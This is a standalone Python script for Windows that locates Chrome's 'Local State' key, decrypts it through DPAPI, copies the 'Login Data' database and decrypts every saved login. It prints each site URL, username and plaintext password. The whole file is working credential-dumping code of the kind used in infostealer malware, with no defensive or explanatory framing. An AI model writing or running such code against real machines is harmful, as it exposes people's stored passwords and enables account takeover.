import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
import logging
import time

logging.basicConfig(level=logging.INFO)

def chrome_date_and_time(chrome_data: int) -> datetime:
    """Convert Chrome timestamp to datetime object."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetch_encryption_key() -> bytes:
    """Fetch and decrypt the Chrome encryption key."""
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI str
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logging.error(f"Error fetching encryption key: {e}")
        return None

def decrypt_password(encrypted_password: bytes, encryption_key: bytes) -> str:
    """Decrypt the password using the encryption key."""
    try:
        iv = encrypted_password[3:15]
        password = encrypted_password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
        except Exception:
            return "Decryption failed"

def main():
    encryption_key = fetch_encryption_key()
    if not encryption_key:
        logging.error("Failed to fetch encryption key")
        return

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    
    try:
        shutil.copyfile(db_path, filename)
        
        with sqlite3.connect(filename) as db:
            cursor = db.cursor()
            cursor.execute(
                "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used "
                "FROM logins ORDER BY date_last_used"
            )
            
            for row in cursor.fetchall():
                main_url, login_url, username, encrypted_password, date_created, date_last_used = row
                decrypted_password = decrypt_password(encrypted_password, encryption_key)
                
                if username or decrypted_password:
                    print(f"Main URL: {main_url}")
                    print(f"Login URL: {login_url}")
                    print(f"Username: {username}")
                    print(f"Decrypted Password: {decrypted_password}")
                    
                    if date_created and date_created != 86400000000:
                        print(f"Creation date: {chrome_date_and_time(date_created)}")
                    
                    if date_last_used and date_last_used != 86400000000:
                        print(f"Last Used: {chrome_date_and_time(date_last_used)}")
                    
                    print("=" * 100)
    
    except Exception as e:
        logging.error(f"An error occurred: {e}")
    
    finally:
        # Close the database connection
        db.close()
        
        # Wait a moment to ensure the file is no longer in use
        time.sleep(1)
        
        try:
            os.remove(filename)
        except Exception as e:
            logging.error(f"Error removing temporary file: {e}")

if __name__ == "__main__":
    main()
